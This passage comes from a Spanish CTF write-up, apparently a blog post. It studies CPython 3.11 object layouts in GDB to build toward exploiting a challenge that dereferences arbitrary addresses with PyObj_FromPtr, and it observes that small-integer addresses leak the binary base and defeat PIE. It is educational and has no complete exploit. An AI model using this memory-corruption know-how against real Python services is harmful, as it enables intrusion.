<span class="mtk1">                </span><span class="mtk8">print</span><span class="mtk1">(PyObj_FromPtr(</span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">addr</span><span class="mtk1">)))</span>  
<span class="mtk1">            </span><span class="mtk5">else</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">'Invalid Address'</span><span class="mtk1">)</span>
</code></pre></div><h2 id="aprendiendo-python-_internals_">Aprendiendo Python <em>internals</em></h2><p>Era nuevo en Python <em>internals</em>, así que necesitaba jugar un poco con el Python REPL dentro de GDB para observar cómo se almacenan los objetos de Python en la memoria. Sin embargo, escribí un <em>script</em> de Python similar al del reto con algunas funciones para probarlas dentro de GDB:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">_ctypes</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> PyObj_FromPtr</span>

<span class="mtk1">storage</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {}</span>

<span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Zero: </span><span class="mtk6">{</span><span class="mtk8">id</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">add</span><span class="mtk1">(</span><span class="mtk9 mtki">inp</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk1">storage</span><span class="mtk1">[</span><span class="mtk8">id</span><span class="mtk1">(</span><span class="mtk9 mtki">inp</span><span class="mtk1">)] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">inp</span>
<span class="mtk1">    </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk8">id</span><span class="mtk1">(</span><span class="mtk9 mtki">inp</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk5">del</span><span class="mtk1"> </span><span class="mtk9 mtki">inp</span>

<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">remove</span><span class="mtk1">(</span><span class="mtk9 mtki">addr</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk9 mtki">addr</span><span class="mtk1">.isdecimal() </span><span class="mtk5">and</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk9 mtki">addr</span><span class="mtk1">) </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">storage</span><span class="mtk1">:  </span>  
<span class="mtk1">        </span><span class="mtk5">del</span><span class="mtk1"> </span><span class="mtk1">storage</span><span class="mtk1">[</span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk9 mtki">addr</span><span class="mtk1">)]</span>
<span class="mtk1">        </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">'removed'</span><span class="mtk1">)</span>

<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">load</span><span class="mtk1">(</span><span class="mtk9 mtki">addr</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk9 mtki">addr</span><span class="mtk1">.isdecimal():</span>
<span class="mtk1">        </span><span class="mtk8">print</span><span class="mtk1">(PyObj_FromPtr(</span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk9 mtki">addr</span><span class="mtk1">)))</span>
<span class="mtk1">    </span><span class="mtk5">else</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">'Invalid Address'</span><span class="mtk1">)</span>
</code></pre></div><p>Ahora podemos depurar <code>python3.11</code> como binario y ejecutarlo con la opción <code>-i</code> para tener el REPL una vez que se cargue el código:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q python3.11
Reading symbols from <span class="code-dark-green">python3.11</span>...
<span class="code-red">gef➤  </span>run -i test.py
Starting program: /usr/local/bin/python3.11 -i test.py
[Thread debugging using libthread_db enabled]
Using host libthread_db library "<span class="code-dark-green">/lib/x86_64-linux-gnu/libthread_db.so.1</span>".  
Zero: 93824997988328
&gt;&gt;&gt;
</code></pre></div><p>Durante la resolución del reto, encontré algunos recursos útiles para aprender de Python <em>internals</em>:</p><ul><li><a target="_blank" href="https://mcla.ug/blog/cpython-hackage.html"><em>Let&rsquo;s break CPython together, for fun and mischief</em></a></li><li><a target="_blank" href="https://pwn.win/2022/05/11/python-buffered-reader.html"><em>Exploiting a Use-After-Free for code execution in every version of Python 3</em></a></li><li><a target="_blank" href="https://github.com/python/cpython">cpython</a></li><li><a target="_blank" href="https://devguide.python.org/internals/exploring/"><em>Exploring the Internals</em></a></li></ul><h3 id="objetos-de-python">Objetos de Python</h3><p>Después de leer algunos recursos en Python <em>internals</em>, veremos que la estructura relevante es <code>PyObject</code> (alias de <a target="_blank" href="https://github.com/python/cpython/blob/693ef48df1891a6a30fca6c6db500c7cd08671df/Include/pytypedefs.h#L18"><code>_object</code></a>, que se define <a target="_blank" href="https://github.com/python/cpython/blob/693ef48df1891a6a30fca6c6db500c7cd08671df/Include/object.h#L100">aquí</a>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">/* Nothing is actually declared to be a PyObject, but every pointer to</span>
<span class="mtk3"> * a Python object can be cast to a PyObject*.  This is inheritance built</span>
<span class="mtk3"> * by hand.  Similarly every pointer to a variable-size Python object can,</span>  
<span class="mtk3"> * in addition, be cast to PyVarObject*.</span>
<span class="mtk3"> */</span>
<span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">_object</span><span class="mtk1"> {</span>
<span class="mtk1">    _PyObject_HEAD_EXTRA</span>
<span class="mtk1">    </span><span class="mtk7 mtki">Py_ssize_t</span><span class="mtk1"> ob_refcnt;</span>
<span class="mtk1">    PyTypeObject </span><span class="mtk5">*</span><span class="mtk1">ob_type;</span>
<span class="mtk1">};</span>
</code></pre></div><p>Por ejemplo, podemos analizar la dirección imprimida por <code>id(0)</code> como <code>PyObject</code> en GDB:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>p *(PyObject *) 93824997988328
$1 = {
  ob_refcnt = 0x3b9acc52,
  ob_type = <span class="code-dark-blue">0x5555559db5a0</span> &lt;<span class="code-dark-yellow">PyLong_Type</span>&gt;  
}
</code></pre></div><p>Como se puede ver, hay un campo <code>ob_refcnt</code> que indica el número de referencias a este objeto (tiene sentido que <code>0</code> se use ampliamente en un programa) y un puntero al objeto tipo (<code>PyLong_Type</code>). Podemos ser más específicos y analizar el objeto como <code>PyLongObject</code> para ver más información:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>p *(PyLongObject *) 93824997988328
$2 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x3b9acc52,
      ob_type = <span class="code-dark-blue">0x5555559db5a0</span> &lt;<span class="code-dark-yellow">PyLong_Type</span>&gt;  
    },
    ob_size = 0x0
  },
  ob_digit = {0x0}
}
</code></pre></div><p>El <code>int</code> valor <code>0</code> se inicializa en la memoria cuando se inicia el programa. Esta fue una decisión de los desarrolladores para mejorar el rendimiento, ya que este objeto Python se usará mucho. De hecho, los enteros entre <code>-5</code> y <code>256</code> (incluidos) también se inicializan:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/30gx 93824997988328
<span class="code-dark-blue">0x555555ad17e8</span> &lt;<span class="code-dark-yellow">_PyRuntime</span>+840&gt;:        0x000000003b9acc52      0x00005555559db5a0  
<span class="code-dark-blue">0x555555ad17f8</span> &lt;<span class="code-dark-yellow">_PyRuntime</span>+856&gt;:        0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x555555ad1808</span> &lt;<span class="code-dark-yellow">_PyRuntime</span>+872&gt;:        0x000000003b9acae7      0x00005555559db5a0
<span class="code-dark-blue">0x555555ad1818</span> &lt;<span class="code-dark-yellow">_PyRuntime</span>+888&gt;:        0x0000000000000001      0x0000000000000001
<span class="code-dark-blue">0x555555ad1828</span> &lt;<span class="code-dark-yellow">_PyRuntime</span>+904&gt;:        0x000000003b9aca8c      0x00005555559db5a0
<span class="code-dark-blue">0x555555ad1838</span> &lt;<span class="code-dark-yellow">_PyRuntime</span>+920&gt;:        0x0000000000000001      0x0000000000000002
<span class="code-dark-blue">0x555555ad1848</span> &lt;<span class="code-dark-yellow">_PyRuntime</span>+936&gt;:        0x000000003b9aca3c      0x00005555559db5a0
<span class="code-dark-blue">0x555555ad1858</span> &lt;<span class="code-dark-yellow">_PyRuntime</span>+952&gt;:        0x0000000000000001      0x0000000000000003
<span class="code-dark-blue">0x555555ad1868</span> &lt;<span class="code-dark-yellow">_PyRuntime</span>+968&gt;:        0x000000003b9aca55      0x00005555559db5a0
<span class="code-dark-blue">0x555555ad1878</span> &lt;<span class="code-dark-yellow">_PyRuntime</span>+984&gt;:        0x0000000000000001      0x0000000000000004
<span class="code-dark-blue">0x555555ad1888</span> &lt;<span class="code-dark-yellow">_PyRuntime</span>+1000&gt;:       0x000000003b9aca27      0x00005555559db5a0
<span class="code-dark-blue">0x555555ad1898</span> &lt;<span class="code-dark-yellow">_PyRuntime</span>+1016&gt;:       0x0000000000000001      0x0000000000000005
<span class="code-dark-blue">0x555555ad18a8</span> &lt;<span class="code-dark-yellow">_PyRuntime</span>+1032&gt;:       0x000000003b9aca1e      0x00005555559db5a0
<span class="code-dark-blue">0x555555ad18b8</span> &lt;<span class="code-dark-yellow">_PyRuntime</span>+1048&gt;:       0x0000000000000001      0x0000000000000006
<span class="code-dark-blue">0x555555ad18c8</span> &lt;<span class="code-dark-yellow">_PyRuntime</span>+1064&gt;:       0x000000003b9aca18      0x00005555559db5a0
<span class="code-green">gef➤  </span>p *(PyLongObject *) 0x555555ad18a8
$3 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x3b9aca1e,
      ob_type = <span class="code-dark-blue">0x5555559db5a0</span> &lt;<span class="code-dark-yellow">PyLong_Type</span>&gt;
    },
    ob_size = 0x1
  },
  ob_digit = {0x6}
}
</code></pre></div><p>Esto será útil para la explotación porque estos objetos se almacenan en el binario (tenga en cuenta que la dirección comienza con <code>0x555555</code>, sin ASLR). Por lo tanto, tener la dirección de <code>0</code> nos dará directamente la dirección base del binario para omitir la protección PIE.</p><p>Sigamos explorando. Es bien sabido que las <em>strings</em> en Python son inmutables, así que veamos lo que tenemos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; add('a')
93824997520288  
&gt;&gt;&gt; id('a')
93824997520288
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>p *(PyObject *) 93824997520288
$4 = {
  ob_refcnt = 0x3b9aca08,
  ob_type = <span class="code-dark-blue">0x5555559e51a0</span> &lt;<span class="code-dark-yellow">PyUnicode_Type</span>&gt;  
}
</code></pre></div><p>Muestra <code>PyUnicode_Type</code>. Podemos analizarlo como un <code>PyUnicodeObject</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>p *(PyUnicodeObject *) 93824997520288
$5 = {
  _base = {
    _base = {
      ob_base = {
        ob_refcnt = 0x3b9aca08,
        ob_type = <span class="code-dark-blue">0x5555559e51a0</span> &lt;<span class="code-dark-yellow">PyUnicode_Type</span>&gt;  
      },
      length = 0x1,
      hash = 0x806980da7df19e68,
      state = {
        interned = 0x1,
        kind = 0x1,
        compact = 0x1,
        ascii = 0x1,
        ready = 0x1
      },
      wstr = <span class="code-dark-blue">0x0</span>
    },
    utf8_length = 0x61,
    utf8 = <span class="code-dark-blue">0x0</span>,
    wstr_length = 0x3b9ac9ff
  },
  data = {
    any = <span class="code-dark-blue">0x5555559cbac0</span> &lt;<span class="code-dark-yellow">PyBytes_Type</span>&gt;,
    latin1 = <span class="code-dark-blue">0x5555559cbac0</span> &lt;<span class="code-dark-yellow">PyBytes_Type</span>&gt; "J",
    ucs2 = <span class="code-dark-blue">0x5555559cbac0</span> &lt;<span class="code-dark-yellow">PyBytes_Type</span>&gt;,
    ucs4 = <span class="code-dark-blue">0x5555559cbac0</span> &lt;<span class="code-dark-yellow">PyBytes_Type</span>&gt;
  }
}
</code></pre></div><p>Pero se ve un poco raro. De hecho, el valor ASCII para <code>a</code> es <code>0x61</code>, y aparece como <code>utf8_length</code>&mldr; Eso no tiene sentido. Si echamos un vistazo a <a target="_blank" href="https://github.com/python/cpython/blob/3.11/Include/cpython/unicodeobject.h#L72"><code>unicodeobject.h</code></a>, vemos que hay otras estructuras para objetos <code>str</code>, como <code>PyASCIIObject</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>p *(PyASCIIObject *) 93824997520288
$6 = {
  ob_base = {
    ob_refcnt = 0x3b9aca08,
    ob_type = <span class="code-dark-blue">0x5555559e51a0</span> &lt;<span class="code-dark-yellow">PyUnicode_Type</span>&gt;
  },
  length = 0x1,
  hash = 0x846afae1d6f9bca6,
  state = {
    interned = 0x1,
    kind = 0x1,
    compact = 0x1,
    ascii = 0x1,
    ready = 0x1
  },
  wstr = <span class="code-dark-blue">0x0</span>
}
<span class="code-green">gef➤  </span>x/8gx 93824997520288
<span class="code-dark-blue">0x555555a5f3a0</span> &lt;<span class="code-dark-yellow">const_str_a</span>&gt;:   0x000000003b9aca08      0x00005555559e51a0
<span class="code-dark-blue">0x555555a5f3b0</span> &lt;<span class="code-dark-yellow">const_str_a</span>+16&gt;:        0x0000000000000001      0x846afae1d6f9bca6  
<span class="code-dark-blue">0x555555a5f3c0</span> &lt;<span class="code-dark-yellow">const_str_a</span>+32&gt;:        0x00000000000000e5      0x0000000000000000
<span class="code-dark-blue">0x555555a5f3d0</span> &lt;<span class="code-dark-yellow">const_str_a</span>+48&gt;:        0x0000000000000061      0x0000000000000000
</code></pre></div><p>Como se dice en el código fuente, los datos de <em>string</em> reales están justo después del <code>struct</code>. Como sucedió con el valor de <code>0</code>, los caracteres también se cargan en una determinada dirección de memoria al inicio.</p><p>Ahora, veamos cómo se almacenan los objetos <code>dict</code>. Usemos el <code>storage</code> como ejemplo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; storage
{93824997520288: 'a'}  
&gt;&gt;&gt; id(storage)
140737339407232
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>p *(PyObject *) 140737339407232
$7 = {
  ob_refcnt = 0x1,
  ob_type = <span class="code-dark-blue">0x5555559dc640</span> &lt;<span class="code-dark-yellow">PyDict_Type</span>&gt;  
}
</code></pre></div><p>Específicamente, este es un <code>PyDictObject</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>p *(PyDictObject *) 140737339407232
$8 = {
  ob_base = {
    ob_refcnt = 0x1,
    ob_type = <span class="code-dark-blue">0x5555559dc640</span> &lt;<span class="code-dark-yellow">PyDict_Type</span>&gt;  
  },
  ma_used = 0x1,
  ma_version_tag = 0x66ec,
  ma_keys = <span class="code-dark-blue">0x7ffff70dec90</span>,
  ma_values = <span class="code-dark-blue">0x0</span>
}
</code></pre></div><p>El código fuente para <code>PyDictObject</code> es este:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">typedef</span><span class="mtk1"> </span><span class="mtk7 mtki">struct</span><span class="mtk1"> _dictkeysobject </span><span class="mtk8 mtku">PyDictKeysObject</span><span class="mtk1">;</span>
<span class="mtk5">typedef</span><span class="mtk1"> </span><span class="mtk7 mtki">struct</span><span class="mtk1"> _dictvalues </span><span class="mtk8 mtku">PyDictValues</span><span class="mtk1">;</span>

<span class="mtk3">/* The ma_values pointer is NULL for a combined ta</span><span class="mtk3">ble</span>
<span class="mtk3"> * or points to an array of PyObject* for a split </span><span class="mtk3">table</span>
<span class="mtk3"> */</span>
<span class="mtk5">typedef</span><span class="mtk1"> </span><span class="mtk7 mtki">struct</span><span class="mtk1"> {</span>
<span class="mtk1">    PyObject_HEAD</span>

<span class="mtk3">    /* Number of items in the dictionary */</span>
<span class="mtk1">    </span><span class="mtk7 mtki">Py_ssize_t</span><span class="mtk1"> ma_used;</span>

<span class="mtk3">    /* Dictionary version: globally unique, value </span><span class="mtk3">change each time</span>
<span class="mtk3">       the dictionary is modified */</span>
<span class="mtk1">    </span><span class="mtk7 mtki">uint64_t</span><span class="mtk1"> ma_version_tag;</span>

<span class="mtk1">    PyDictKeysObject </span><span class="mtk5">*</span><span class="mtk1">ma_keys;</span>

<span class="mtk3">    /* If ma_values is NULL, the table is "combine</span><span class="mtk3">d": keys and values</span>
<span class="mtk3">       are stored in ma_keys.</span>

<span class="mtk3">       If ma_values is not NULL, the table is spli</span><span class="mtk3">t:</span>
<span class="mtk3">       keys are stored in ma_keys and values are s</span><span class="mtk3">tored in ma_values */</span>  
<span class="mtk1">    PyDictValues </span><span class="mtk5">*</span><span class="mtk1">ma_values;</span>
<span class="mtk1">} </span><span class="mtk8 mtku">PyDictObject</span><span class="mtk1">;</span>
</code></pre></div><p>Es un poco confuso ya que <code>ma_values</code> puede contener una lista de valores o no. Sin embargo, esto no es relevante para la explotación. Veamos lo que tenemos en <code>ma_keys</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>p *(PyDictKeysObject *) 0x7ffff70dec90  
$9 = {
  dk_refcnt = 0x1,
  dk_log2_size = 0x3,
  dk_log2_index_bytes = 0x3,
  dk_kind = 0x0,
  dk_version = 0x0,
  dk_usable = 0x4,
  dk_nentries = 0x1,
  dk_indices = <span class="code-dark-blue">0x7ffff70decb0</span> ""
}
</code></pre></div><p>Esta es la <a target="_blank" href="https://github.com/python/cpython/blob/3.11/Include/internal/pycore_dict.h#L87">estructura relevante</a>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">/* See dictobject.c for actual layout of DictKeysO</span><span class="mtk3">bject */</span>
<span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">_dictkeysobject</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">Py_ssize_t</span><span class="mtk1"> dk_refcnt;</span>

<span class="mtk3">    /* Size of the hash table (dk_indices). It mus</span><span class="mtk3">t be a power of 2. */</span>
<span class="mtk1">    </span><span class="mtk7 mtki">uint8_t</span><span class="mtk1"> dk_log2_size;</span>

<span class="mtk3">    /* Size of the hash table (dk_indices) by byte</span><span class="mtk3">s. */</span>
<span class="mtk1">    </span><span class="mtk7 mtki">uint8_t</span><span class="mtk1"> dk_log2_index_bytes;</span>

<span class="mtk3">    /* Kind of keys */</span>
<span class="mtk1">    </span><span class="mtk7 mtki">uint8_t</span><span class="mtk1"> dk_kind;</span>

<span class="mtk3">    /* Version number -- Reset to 0 by any modific</span><span class="mtk3">ation to keys */</span>
<span class="mtk1">    </span><span class="mtk7 mtki">uint32_t</span><span class="mtk1"> dk_version;</span>

<span class="mtk3">    /* Number of usable entries in dk_entries. */</span>
<span class="mtk1">    </span><span class="mtk7 mtki">Py_ssize_t</span><span class="mtk1"> dk_usable;</span>

<span class="mtk3">    /* Number of used entries in dk_entries. */</span>
<span class="mtk1">    </span><span class="mtk7 mtki">Py_ssize_t</span><span class="mtk1"> dk_nentries;</span>

<span class="mtk3">    /* Actual hash table of dk_size entries. It ho</span><span class="mtk3">lds indices in dk_entries,</span>
<span class="mtk3">       or DKIX_EMPTY(-1) or DKIX_DUMMY(-2).</span>

<span class="mtk3">       Indices must be: 0 &lt;= indice &lt; USABLE_FRACT</span><span class="mtk3">ION(dk_size).</span>

<span class="mtk3">       The size in bytes of an indice depends on d</span><span class="mtk3">k_size:</span>

<span class="mtk3">       - 1 byte if dk_size &lt;= 0xff (char*)</span>
<span class="mtk3">       - 2 bytes if dk_size &lt;= 0xffff (int16_t*)</span>
<span class="mtk3">       - 4 bytes if dk_size &lt;= 0xffffffff (int32_t</span><span class="mtk3">*)</span>
<span class="mtk3">       - 8 bytes otherwise (int64_t*)</span>

<span class="mtk3">       Dynamically sized, SIZEOF_VOID_P is minimum</span><span class="mtk3">. */</span>
<span class="mtk1">    </span><span class="mtk7 mtki">char</span><span class="mtk1"> dk_indices[];</span><span class="mtk3">  /* char is required to avoid strict aliasing. */</span>

<span class="mtk3">    /* "PyDictKeyEntry or PyDictUnicodeEntry dk_entries[USABLE_FRACTION(DK_SIZE(dk))];" array follows:</span>  
<span class="mtk3">       see the DK_ENTRIES() macro */</span>
};
</code></pre></div><p>Curiosamente, <code>dk_indices</code> es un <code>char[]</code>. Agreguemos otro elemento a <code>storage</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; add('asdf')  
140737338225328
</code></pre></div><p>Solo para verificar, veamos si podemos analizar esta cadena correctamente:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>p *(PyASCIIObject *) 140737338225328
$10 = {
  ob_base = {
    ob_refcnt = 0x1,
    ob_type = <span class="code-dark-blue">0x5555559e51a0</span> &lt;<span class="code-dark-yellow">PyUnicode_Type</span>&gt;
  },
  length = 0x4,
  hash = 0xad8cd6c17573b37b,
  state = {
    interned = 0x1,
    kind = 0x1,
    compact = 0x1,
    ascii = 0x1,
    ready = 0x1
  },
  wstr = <span class="code-dark-blue">0x0</span>
}
<span class="code-green">gef➤  </span>x/8gx 140737338225328
<span class="code-dark-blue">0x7ffff70d32b0</span>: 0x0000000000000001      0x00005555559e51a0
<span class="code-dark-blue">0x7ffff70d32c0</span>: 0x0000000000000004      0xad8cd6c17573b37b
<span class="code-dark-blue">0x7ffff70d32d0</span>: 0x01650065000200e5      0x0000000000000000
<span class="code-dark-blue">0x7ffff70d32e0</span>: 0x3333370066647361      0x0032333237303439
<span class="code-green">gef➤  </span>telescope 140737338225328
<span class="code-dark-cyan">0x00007ffff70d32b0</span>│+0x0000: 0x0000000000000001
<span class="code-dark-cyan">0x00007ffff70d32b8</span>│+0x0008: <span class="code-dark-red">0x00005555559e51a0</span>  →  0x000000000000005a ("<span class="code-dark-yellow">Z</span>"?)
<span class="code-dark-cyan">0x00007ffff70d32c0</span>│+0x0010: 0x0000000000000004
<span class="code-dark-cyan">0x00007ffff70d32c8</span>│+0x0018: 0xad8cd6c17573b37b
<span class="code-dark-cyan">0x00007ffff70d32d0</span>│+0x0020: 0x01650065000200e5
<span class="code-dark-cyan">0x00007ffff70d32d8</span>│+0x0028: 0x0000000000000000
<span class="code-dark-cyan">0x00007ffff70d32e0</span>│+0x0030: 0x3333370066647361 ("<span class="code-dark-yellow">asdf</span>"?)
<span class="code-dark-cyan">0x00007ffff70d32e8</span>│+0x0038: 0x0032333237303439 ("<span class="code-dark-yellow">9407232</span>"?)
<span class="code-dark-cyan">0x00007ffff70d32f0</span>│+0x0040: 0x00007ffff70d3330  →  0x00007ffff70d3370  →  0x0000000000000000  
<span class="code-dark-cyan">0x00007ffff70d32f8</span>│+0x0048: <span class="code-dark-red">0x00005555559e51a0</span>  →  0x000000000000005a ("<span class="code-dark-yellow">Z</span>"?)
</code></pre></div><p>Si miramos ahora <code>dk_indices</code> de <code>storage</code>, tenemos esto:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/10gx 0x7ffff70decb0
<span class="code-dark-blue">0x7ffff70decb0</span>: 0xff01ffffffffff00      0x0000555555a5f3a0  
<span class="code-dark-blue">0x7ffff70decc0</span>: 0x00007ffff726afb0      0x0000555555a5f3a0
<span class="code-dark-blue">0x7ffff70decd0</span>: 0x00007ffff70d32b0      0x00007ffff726afd0
<span class="code-dark-blue">0x7ffff70dece0</span>: 0x00007ffff70d32b0      0x0000000000000000
<span class="code-dark-blue">0x7ffff70decf0</span>: 0x0000000000000000      0x0000000000000000
</code></pre></div><p>Se ve muy extraño porque tanto las claves como los valores se almacenan aquí. En realidad, esta es una tabla <em>hash</em>. El primer valor <code>0x0000555555a5f3a0</code> es la clave (la dirección de <code>'a'</code>), luego, <code>0x00007ffff726afb</code> contiene un <code>PyLongObject</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>p *(PyObject *) 0x00007ffff726afb0
$11 = {
  ob_refcnt = 0x1,
  ob_type = <span class="code-dark-blue">0x5555559db5a0</span> &lt;<span class="code-dark-yellow">PyLong_Type</span>&gt;
}
<span class="code-green">gef➤  </span>p *(PyLongObject *) 0x00007ffff726afb0  
$12 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x1,
      ob_type = <span class="code-dark-blue">0x5555559db5a0</span> &lt;<span class="code-dark-yellow">PyLong_Type</span>&gt;
    },
    ob_size = 0x2
  },
  ob_digit = {0x15a5f3a0}
}
</code></pre></div><p>Aquí noté que el valor del <code>int</code> aquí es <code>0x15a5f3a0</code>, que es muy similar a <code>0x0000555555a5f3a0</code>. En realidad, representa los 4 bytes inferiores de la dirección (casi):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>p/x 0x0000555555a5f3a0 & 0x3fffffff  
$13 = 0x15a5f3a0
</code></pre></div><p>Entonces, este valor probablemente actúa como un <em>hash</em>. Y luego tenemos <code>0x0000555555a5f3a0</code>, ¿Cuál es la dirección de <code>'a'</code>. Esto es un poco confuso porque <code>storage</code> usa la dirección del objeto <code>str</code> como clave&mldr; Este es el <em>hash</em> de la segunda entrada:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>p *(PyObject *) 0x00007ffff726aff0
$14 = {
  ob_refcnt = 0x1,
  ob_type = <span class="code-dark-blue">0x5555559db5a0</span> &lt;<span class="code-dark-yellow">PyLong_Type</span>&gt;
}
<span class="code-green">gef➤  </span>p *(PyLongObject *) 0x00007ffff726aff0  
$15 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x1,
      ob_type = <span class="code-dark-blue">0x5555559db5a0</span> &lt;<span class="code-dark-yellow">PyLong_Type</span>&gt;
    },
    ob_size = 0x2
  },
  ob_digit = {0x370d31f0}
}
<span class="code-green">gef➤  </span>p/x 0x00007ffff70d31f0 & 0x3fffffff
$16 = 0x370d31f0
</code></pre></div><p>Si eliminamos una clave, se elimina de la memoria:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; storage
{93824997520288: 'a', 140737338225328: 'asdf'}  
&gt;&gt;&gt; remove('93824997520288')
removed
&gt;&gt;&gt; storage
{140737338225328: 'asdf'}
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/10gx 0x7ffff70decb0
<span class="code-dark-blue">0x7ffff70decb0</span>:	0xffff01fffffffffe	0x0000000000000000  
<span class="code-dark-blue">0x7ffff70decc0</span>:	0x0000000000000000	0x0000000000000000
<span class="code-dark-blue">0x7ffff70decd0</span>:	0x00007ffff70d32b0	0x00007ffff726afd0
<span class="code-dark-blue">0x7ffff70dece0</span>:	0x00007ffff70d32b0	0x0000000000000000
